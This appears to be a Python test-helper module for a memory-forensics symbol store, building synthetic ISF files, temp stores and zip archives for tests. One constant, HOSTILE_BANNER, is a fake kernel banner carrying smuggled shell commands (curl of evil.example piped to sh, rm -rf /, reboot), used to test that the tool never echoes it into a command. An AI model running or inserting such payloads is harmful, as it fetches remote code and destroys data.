"""Shared builders for the symbol-store tests (M8 phase 5).

Everything here is synthetic and hand-written: tiny ISF documents that only carry the
metadata the store needs (no real kernel's types), a minimal stand-in for Volatility's ISF
schema (the container tests also check the real 2.28.2 schemas), and a per-test store in a
temp dir (never the shared `memory_symbols_test` volume, RT6). No test ever contacts the
network outside a loopback mock.
"""

from __future__ import annotations

import base64
import hashlib
import io
import json
import lzma
import os
import zipfile
from pathlib import Path
from typing import Any

import cyberlab_jobs

from memory_worker.symbols.manifest import StoreWriter

# The shared `memory.v1` fixtures (as in conftest, which needs the Linux sandbox kit).
CONTRACT_FIXTURES = (
    Path(cyberlab_jobs.__file__).resolve().parents[2] / "tests" / "fixtures" / "memory"
)

FORMAT = "6.2.0"
GUID = "0123456789ABCDEF0123456789ABCDEF"
BANNER = (
    "Linux version 6.1.0-26-amd64 (debian-kernel@lists.debian.org) (gcc-12 (Debian 12.2.0-14) "
    "12.2.0) #1 SMP PREEMPT_DYNAMIC Debian 6.1.112-1 (2024-09-30)"
)
# A banner an attacker could plant in an image: printable, so it passes `LinuxBanner`, but
# shell-active. It must never appear inside a command the tool prints (RT12).
HOSTILE_BANNER = "Linux version 6.1 $(curl evil.example|sh); rm -rf / `id` 'x\" && reboot"

# Stand-in for volatility3/schemas/schema-6.2.0.json: the top-level ISF shape only.
MINI_SCHEMA: dict[str, Any] = {
    "$schema": "http://json-schema.org/draft-04/schema#",
    "type": "object",
    "required": ["metadata", "base_types", "user_types", "enums", "symbols"],
    "properties": {
        "metadata": {
            "type": "object",
            "required": ["format"],
            "properties": {"format": {"type": "string"}},
        },
        "base_types": {"type": "object"},
        "user_types": {"type": "object"},
        "enums": {"type": "object"},
        "symbols": {"type": "object"},
    },
}


def schema_dir(tmp_path: Path) -> Path:
    path = tmp_path / "schemas"
    path.mkdir(exist_ok=True)
    (path / f"schema-{FORMAT}.json").write_text(json.dumps(MINI_SCHEMA))
    return path


def _base(**metadata: Any) -> dict[str, Any]:
    return {
        "metadata": {"format": FORMAT, "producer": {"name": "test", "version": "0"}, **metadata},
        "base_types": {"int": {"kind": "int", "size": 4, "signed": True, "endian": "little"}},
        "user_types": {},
        "enums": {},
        "symbols": {},
    }


def windows_isf(name: str = "ntkrnlmp.pdb", guid: str = GUID, age: int = 1) -> dict[str, Any]:
    pdb = {"GUID": guid, "age": age, "database": name, "machine_type": 34404}
    return _base(windows={"pdb": pdb})


def linux_isf(banner: str = BANNER) -> dict[str, Any]:
    doc = _base(linux={"symbols": []})
    raw = (banner + "\n\x00").encode("ascii")
    doc["symbols"]["linux_banner"] = {
        "type": {"kind": "array", "count": len(raw), "subtype": {"kind": "base", "name": "char"}},
        "address": 0,
        "constant_data": base64.b64encode(raw).decode(),
    }
    return doc


def dumps(doc: dict[str, Any]) -> bytes:
    return json.dumps(doc).encode()


def xz(data: bytes) -> bytes:
    return lzma.compress(data, format=lzma.FORMAT_XZ)


def new_store(tmp_path: Path) -> Path:
    root = tmp_path / "symbols"
    (root / "windows").mkdir(parents=True)
    (root / "linux").mkdir()
    (root / ".cache" / "volatility3").mkdir(parents=True)
    (root / "manifest.json").write_text(
        '{"version": 1, "volatility_version": "2.28.2", "files": []}\n'
    )
    return root


def import_dir(tmp_path: Path) -> Path:
    path = tmp_path / "import"
    path.mkdir(exist_ok=True)
    return path


def zip_bytes(members: dict[str, bytes], *, symlinks: dict[str, str] | None = None) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        for name, data in members.items():
            zf.writestr(name, data)
        for name, target in (symlinks or {}).items():
            info = zipfile.ZipInfo(name)
            info.create_system = 3
            info.external_attr = 0o120777 << 16
            zf.writestr(info, target)
    return buf.getvalue()


def put(root: Path, identity: Any, content: bytes, source: str = "operator") -> str:
    """Place `content` for `identity` through the real store writer; returns its sha256."""
    digest = hashlib.sha256(content).hexdigest()
    with StoreWriter(root) as writer:
        staged = writer.work_dir("test") / "file.json.xz"
        staged.write_bytes(content)
        writer.stage(staged, identity, digest, source)
        writer.commit()
    return digest


def tamper(path: Path, content: bytes = b"tampered") -> None:
    os.chmod(path, 0o644)
    path.write_bytes(content)
